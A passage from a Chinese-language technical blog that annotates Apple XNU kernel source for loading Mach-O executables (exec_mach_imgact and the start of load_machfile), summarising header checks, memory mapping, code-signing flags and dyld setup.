&amp;&amp;</span><br><span class="line">	    (mach_header-&gt;magic != MH_MAGIC_64)) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	// 检测macho的文件类型，文件类型必须是可执行文件</span><br><span class="line">   	// 还有一些其他的常见类型</span><br><span class="line">    // #define	MH_OBJECT	0x1		编译过程产生的obj文件</span><br><span class="line">    // #define	MH_CORE		0x4		崩溃时的dump文件</span><br><span class="line">	if (mach_header-&gt;filetype != MH_EXECUTE) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    // 获取macho的执行环境，cpu的平台与版本</span><br><span class="line">	if (imgp-&gt;ip_origcputype != 0) &#123;</span><br><span class="line">		/* Fat header previously had an idea about this thin file */</span><br><span class="line">		if (imgp-&gt;ip_origcputype != mach_header-&gt;cputype ||</span><br><span class="line">			imgp-&gt;ip_origcpusubtype != mach_header-&gt;cpusubtype) &#123;</span><br><span class="line">			error = EBADARCH;</span><br><span class="line">			goto bad;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_origcputype = mach_header-&gt;cputype;</span><br><span class="line">		imgp-&gt;ip_origcpusubtype = mach_header-&gt;cpusubtype;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	task = current_task();</span><br><span class="line">	thread = current_thread();</span><br><span class="line">	uthread = get_bsdthread_info(thread);</span><br><span class="line"></span><br><span class="line">	if ((mach_header-&gt;cputype &amp; CPU_ARCH_ABI64) == CPU_ARCH_ABI64)</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_IS_64BIT;</span><br><span class="line"></span><br><span class="line">	/* If posix_spawn binprefs exist, respect those prefs. */</span><br><span class="line">	psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">	if (psa != NULL &amp;&amp; psa-&gt;psa_binprefs[0] != 0) &#123;</span><br><span class="line">		int pr = 0;</span><br><span class="line">		for (pr = 0; pr &lt; NBINPREFS; pr++) &#123;</span><br><span class="line">			cpu_type_t pref = psa-&gt;psa_binprefs[pr];</span><br><span class="line">			if (pref == 0) &#123;</span><br><span class="line">				/* No suitable arch in the pref list */</span><br><span class="line">				error = EBADARCH;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == CPU_TYPE_ANY) &#123;</span><br><span class="line">				/* Jump to regular grading */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == imgp-&gt;ip_origcputype) &#123;</span><br><span class="line">				/* We have a match! */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">grade:</span><br><span class="line">  	//检测cpu平台</span><br><span class="line">	if (!grade_binary(imgp-&gt;ip_origcputype, imgp-&gt;ip_origcpusubtype &amp; ~CPU_SUBTYPE_MASK)) 	  &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Copy in arguments/environment from the old process */</span><br><span class="line">    //获取环境变量和参数</span><br><span class="line">    //为vfork执行macho做准备</span><br><span class="line">	error = exec_extract_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	error = exec_add_apple_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	AUDIT_ARG(argv, imgp-&gt;ip_startargv, imgp-&gt;ip_argc, </span><br><span class="line">	    imgp-&gt;ip_endargv - imgp-&gt;ip_startargv);</span><br><span class="line">	AUDIT_ARG(envv, imgp-&gt;ip_endargv, imgp-&gt;ip_envc,</span><br><span class="line">	    imgp-&gt;ip_endenvv - imgp-&gt;ip_endargv);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We are being called to activate an image subsequent to a vfork()</span><br><span class="line">	 * operation; in this case, we know that our task, thread, and</span><br><span class="line">	 * uthread are actually those of our parent, and our proc, which we</span><br><span class="line">	 * obtained indirectly from the image_params vfs_context_t, is the</span><br><span class="line">	 * new child process.</span><br><span class="line">	 */</span><br><span class="line">    // 通过fork，为macho生成一个新的线程</span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			imgp-&gt;ip_new_thread = fork_create_child(task, NULL, p, FALSE, (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT));</span><br><span class="line">			if (imgp-&gt;ip_new_thread == NULL) &#123;</span><br><span class="line">				error = ENOMEM;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* reset local idea of thread, uthread, task */</span><br><span class="line">		thread = imgp-&gt;ip_new_thread;</span><br><span class="line">		uthread = get_bsdthread_info(thread);</span><br><span class="line">		task = new_task = get_threadtask(thread);</span><br><span class="line">		map = get_task_map(task);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		map = VM_MAP_NULL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We set these flags here; this is OK, since if we fail after</span><br><span class="line">	 * this point, we have already destroyed the parent process anyway.</span><br><span class="line">	 */</span><br><span class="line">    // 设置一些dyld需要使用的参数</span><br><span class="line">	task_set_dyld_info(task, MACH_VM_MIN_ADDRESS, 0);</span><br><span class="line">	if (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) &#123;</span><br><span class="line">		task_set_64bit(task, TRUE);</span><br><span class="line">		OSBitOrAtomic(P_LP64, &amp;p-&gt;p_flag);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		task_set_64bit(task, FALSE);</span><br><span class="line">		OSBitAndAtomic(~((uint32_t)P_LP64), &amp;p-&gt;p_flag);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 *	Load the Mach-O file.</span><br><span class="line">	 *</span><br><span class="line">	 * NOTE: An error after this point  indicates we have potentially</span><br><span class="line">	 * destroyed or overwritten some process state while attempting an</span><br><span class="line">	 * execve() following a vfork(), which is an unrecoverable condition.</span><br><span class="line">	 * We send the new process an immediate SIGKILL to avoid it executing</span><br><span class="line">	 * any instructions in the mutated address space. For true spawns,</span><br><span class="line">	 * this is not the case, and "too late" is still not too late to</span><br><span class="line">	 * return an error code to the parent process.</span><br><span class="line">	 */</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Actually load the image file we previously decided to load.</span><br><span class="line">	 */</span><br><span class="line">    //加载，映射macho文件到内存</span><br><span class="line">	lret = load_machfile(imgp, mach_header, thread, map, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(lret);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	p-&gt;p_cputype = imgp-&gt;ip_origcputype;</span><br><span class="line">	p-&gt;p_cpusubtype = imgp-&gt;ip_origcpusubtype;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line"></span><br><span class="line">	vm_map_set_user_wire_limit(get_task_map(task), p-&gt;p_rlimit[RLIMIT_MEMLOCK].rlim_cur);</span><br><span class="line"></span><br><span class="line">	/* </span><br><span class="line">	 * Set code-signing flags if this binary is signed, or if parent has</span><br><span class="line">	 * requested them on exec.</span><br><span class="line">	 */</span><br><span class="line">  	//设置了一堆标记位</span><br><span class="line">    //需要关心一下的是这里和code-signgin有点关系</span><br><span class="line">	if (load_result.csflags &amp; CS_VALID) &#123;</span><br><span class="line">		imgp-&gt;ip_csflags |= load_result.csflags &amp; </span><br><span class="line">			(CS_VALID|</span><br><span class="line">			 CS_HARD|CS_KILL|CS_RESTRICT|CS_ENFORCEMENT|CS_REQUIRE_LV|CS_DYLD_PLATFORM|</span><br><span class="line">			 CS_EXEC_SET_HARD|CS_EXEC_SET_KILL|CS_EXEC_SET_ENFORCEMENT);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_csflags &amp;= ~CS_VALID;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_HARD)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_HARD;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_KILL)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_KILL;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_ENFORCEMENT)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_ENFORCEMENT;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_INSTALLER)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_INSTALLER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set up the system reserved areas in the new address space.</span><br><span class="line">	 */</span><br><span class="line">    //依据可执行文件的平台，设置合适的执行环境</span><br><span class="line">	vm_map_exec(get_task_map(task),</span><br><span class="line">		    task,</span><br><span class="line">		    (void *) p-&gt;p_fd-&gt;fd_rdir,</span><br><span class="line">		    cpu_type());</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	 * Close file descriptors which specify close-on-exec.</span><br><span class="line">	 */</span><br><span class="line">    //关闭所有被标记为close-on-exec的文件</span><br><span class="line">	fdexec(p, psa != NULL ? psa-&gt;psa_flags : 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with set[ug]id.</span><br><span class="line">	 */</span><br><span class="line">  	//处理setuid相关的逻辑，和权限相关</span><br><span class="line">	error = exec_handle_sugid(imgp);</span><br><span class="line">	if (error) &#123;</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with voucher on exec-calling thread.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_new_thread == NULL)</span><br><span class="line">		thread_set_mach_voucher(current_thread(), IPC_VOUCHER_NULL);</span><br><span class="line"></span><br><span class="line">	/* Make sure we won't interrupt ourself signalling a partial process */</span><br><span class="line">	if (!vfexec &amp;&amp; !spawn &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED))</span><br><span class="line">		psignal(p, SIGTRAP);</span><br><span class="line">	</span><br><span class="line">  	//为进程设置应用层的栈地址</span><br><span class="line">	if (load_result.unixproc &amp;&amp;</span><br><span class="line">		create_unix_stack(get_task_map(task),</span><br><span class="line">				  &amp;load_result,</span><br><span class="line">				  p) != KERN_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(LOAD_NOSPACE);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		old_map = vm_map_switch(get_task_map(task));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (load_result.unixproc) &#123;</span><br><span class="line">		user_addr_t	ap;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Copy the strings area out into the new process address</span><br><span class="line">		 * space.</span><br><span class="line">		 */</span><br><span class="line">		ap = p-&gt;user_stack;</span><br><span class="line">		error = exec_copyout_strings(imgp, &amp;ap);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		/* Set the stack */</span><br><span class="line">		thread_setuserstack(thread, ap);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if (load_result.dynlinker) &#123;</span><br><span class="line">		uint64_t	ap;</span><br><span class="line">		int			new_ptr_size = (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) ? 8 : 4;</span><br><span class="line"></span><br><span class="line">		/* Adjust the stack */</span><br><span class="line">		ap = thread_adjuserstack(thread, -new_ptr_size);</span><br><span class="line">		error = copyoutptr(load_result.mach_header, ap, new_ptr_size);</span><br><span class="line"></span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		task_set_dyld_info(task, load_result.all_image_info_addr,</span><br><span class="line">		    load_result.all_image_info_size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Avoid immediate VM faults back into kernel */</span><br><span class="line">  	//防止立刻执行指令导致的错误，做了大量和dyld相关的事情</span><br><span class="line">	exec_prefault_data(p, imgp, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		vm_map_switch(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	/* Set the entry point */</span><br><span class="line">	thread_setentrypoint(thread, load_result.entry_point);</span><br><span class="line"></span><br><span class="line">	/* Stop profiling */</span><br><span class="line">	stopprofclock(p);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Reset signal state.</span><br><span class="line">	 */</span><br><span class="line">	execsigs(p, thread);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * need to cancel async IO requests that can be cancelled and wait for those</span><br><span class="line">	 * already active.  MAY BLOCK!</span><br><span class="line">	 */</span><br><span class="line">	_aio_exec( p );</span><br><span class="line"></span><br><span class="line">#if SYSV_SHM</span><br><span class="line">	/* FIXME: Till vmspace inherit is fixed: */</span><br><span class="line">	if (!vfexec &amp;&amp; p-&gt;vm_shm)</span><br><span class="line">		shmexec(p);</span><br><span class="line">#endif</span><br><span class="line">#if SYSV_SEM</span><br><span class="line">	/* Clean up the semaphores */</span><br><span class="line">	semexit(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Remember file name for accounting.</span><br><span class="line">	 */</span><br><span class="line">	p-&gt;p_acflag &amp;= ~AFORK;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set p-&gt;p_comm and p-&gt;p_name to the name passed to exec</span><br><span class="line">	 */</span><br><span class="line">	p_name_len = sizeof(p-&gt;p_name) - 1;</span><br><span class="line">	if(imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; p_name_len)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = p_name_len;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_name,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_name[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	if (imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; MAXCOMLEN)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = MAXCOMLEN;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_comm,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_comm[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	pal_dbg_set_task_name( p-&gt;task );</span><br><span class="line"></span><br><span class="line">#if DEVELOPMENT || DEBUG</span><br><span class="line">	/* </span><br><span class="line">	 * Update the pid an proc name for importance base if any</span><br><span class="line">	 */</span><br><span class="line">	task_importance_update_owner_info(p-&gt;task);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	memcpy(&amp;p-&gt;p_uuid[0], &amp;load_result.uuid[0], sizeof(p-&gt;p_uuid));</span><br><span class="line"></span><br><span class="line">// &lt;rdar://6598155&gt; dtrace code cleanup needed</span><br><span class="line">#if CONFIG_DTRACE</span><br><span class="line">	/*</span><br><span class="line">	 * Invalidate any predicate evaluation already cached for this thread by DTrace.</span><br><span class="line">	 * That's because we've just stored to p_comm and DTrace refers to that when it</span><br><span class="line">	 * evaluates the "execname" special variable. uid and gid may have changed as well.</span><br><span class="line">	 */</span><br><span class="line">	dtrace_set_thread_predcache(current_thread(), 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Free any outstanding lazy dof entries. It is imperative we</span><br><span class="line">	 * always call dtrace_lazy_dofs_destroy, rather than null check</span><br><span class="line">	 * and call if !NULL. If we NULL test, during lazy dof faulting</span><br><span class="line">	 * we can race with the faulting code and proceed from here to</span><br><span class="line">	 * beyond the helpers cleanup. The lazy dof faulting will then</span><br><span class="line">	 * install new helpers which no longer belong to this process!</span><br><span class="line">	 */</span><br><span class="line">	dtrace_lazy_dofs_destroy(p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">    	 * Clean up any DTrace helpers for the process.</span><br><span class="line">    	 */</span><br><span class="line">    	if (p-&gt;p_dtrace_helpers != NULL &amp;&amp; dtrace_helpers_cleanup) &#123;</span><br><span class="line">    		(*dtrace_helpers_cleanup)(p);</span><br><span class="line">    	&#125;</span><br><span class="line">	</span><br><span class="line">    	/*</span><br><span class="line">    	 * Cleanup the DTrace provider associated with this process.</span><br><span class="line">    	 */</span><br><span class="line">	proc_lock(p);</span><br><span class="line">	if (p-&gt;p_dtrace_probes &amp;&amp; dtrace_fasttrap_exec_ptr) &#123;</span><br><span class="line">		(*dtrace_fasttrap_exec_ptr)(p);</span><br><span class="line">	&#125;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	if (kdebug_enable) &#123;</span><br><span class="line">		long dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Collect the pathname for tracing</span><br><span class="line">		 */</span><br><span class="line">		kdbg_trace_string(p, &amp;dbg_arg1, &amp;dbg_arg2, &amp;dbg_arg3, &amp;dbg_arg4);</span><br><span class="line"></span><br><span class="line">		if (vfexec || spawn) &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0, (uintptr_t)thread_tid(thread));</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, (uintptr_t)thread_tid(thread));</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0,0);</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * If posix_spawned with the START_SUSPENDED flag, stop the</span><br><span class="line">	 * process before it runs.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_px_sa != NULL) &#123;</span><br><span class="line">		psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">		if (psa-&gt;psa_flags &amp; POSIX_SPAWN_START_SUSPENDED) &#123;</span><br><span class="line">			proc_lock(p);</span><br><span class="line">			p-&gt;p_stat = SSTOP;</span><br><span class="line">			proc_unlock(p);</span><br><span class="line">			(void) task_suspend_internal(p-&gt;task);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * mark as execed, wakeup the process that vforked (if any) and tell</span><br><span class="line">	 * it that it now has its own resources back</span><br><span class="line">	 */</span><br><span class="line">	OSBitOrAtomic(P_EXEC, &amp;p-&gt;p_flag);</span><br><span class="line">	proc_resetregister(p);</span><br><span class="line">	if (p-&gt;p_pptr &amp;&amp; (p-&gt;p_lflag &amp; P_LPPWAIT)) &#123;</span><br><span class="line">		proc_lock(p);</span><br><span class="line">		p-&gt;p_lflag &amp;= ~P_LPPWAIT;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		wakeup((caddr_t)p-&gt;p_pptr);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Pay for our earlier safety; deliver the delayed signals from</span><br><span class="line">	 * the incomplete vfexec process now that it's complete.</span><br><span class="line">	 */</span><br><span class="line">	if (vfexec &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED)) &#123;</span><br><span class="line">		psignal_vfork(p, new_task, thread, SIGTRAP);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	goto done;</span><br><span class="line"></span><br><span class="line">badtoolate:</span><br><span class="line">	/* Don't allow child process to execute any instructions */</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			psignal_vfork(p, new_task, thread, SIGKILL);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			psignal(p, SIGKILL);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* We can't stop this system call at this point, so just pretend we succeeded */</span><br><span class="line">		error = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">done:</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		/* notify only if it has not failed due to FP Key error */</span><br><span class="line">		if ((p-&gt;p_lflag &amp; P_LTERM_DECRYPTFAIL) == 0)</span><br><span class="line">			proc_knote(p, NOTE_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Drop extra references for cases where we don't expect the caller to clean up */</span><br><span class="line">	if (vfexec || (spawn &amp;&amp; error == 0)) &#123;</span><br><span class="line">		task_deallocate(new_task);</span><br><span class="line">		thread_deallocate(thread);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数主要做这几件事情：</p>
<ul>
<li>对macho文件做最基本的检测</li>
<li><code>fork</code>新的线程运行macho</li>
<li>映射macho文件到内存中</li>
<li>对setuid，code-sign等权限相关的事情有处理</li>
<li>为dyld接手macho文件的处理做了大量的准备工作</li>
<li>dyld处理完之后，对资源的释放</li>
</ul>
<h2 id="1-4_load_machfile">1.4 load_machfile</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load_return_t</span></span><br><span class="line">load_machfile(</span><br><span class="line">	<span class="keyword">struct</span> image_params	*imgp,</span><br><span class="line">	<span class="keyword">struct</span> mach_header	*header,</span><br><span class="line">	<span class="keyword">thread_t</span> 		thread,</span><br><span class="line">	<span class="keyword">vm_map_t</span> 		new_map,</span><br><span class="line">	<span class="keyword">load_result_t</span>		*result</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> vnode		*vp = imgp-&gt;ip_vp;</span><br><span class="line">	<span class="keyword">off_t</span>			file_offset = imgp-&gt;ip_arch_offset;</span><br><span class="line">	<span class="keyword">off_t</span>			macho_size = imgp-&gt;ip_arch_size;</span><br><span class="line">	<span class="keyword">off_t</span>			file_size = imgp-&gt;ip_vattr-&gt;va_data_size;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">pmap_t</span>			pmap = <span class="number">0</span>;	<span class="comment">/* protected by create_map */</span></span><br><span class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>;</span><br><span class="line">	<span class="keyword">vm_map_t</span>		old_map;</span><br><span class="line">	<span class="keyword">task_t</span>			old_task = TASK_NULL; <span class="comment">/* protected by create_map */</span></span><br><span class="line">	<span class="keyword">load_result_t</span>		myresult;</span><br><span class="line">	<span class="keyword">load_return_t</span>		lret;</span><br><span class="line">	<span class="keyword">boolean_t</span> create_map = FALSE;</span><br><span class="line">	<span class="keyword">boolean_t</span> enforce_hard_pagezero = TRUE;</span><br><span class="line">	<span class="keyword">int</span> spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span class="line">	<span class="keyword">task_t</span> task = current_task();</span><br><span class="line">	<span class="keyword">proc_t</span> p = current_proc();</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	dyld_aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">kern_return_t</span> 		kret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (macho_size &gt; file_size) &#123;</span><br><span class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (new_map == 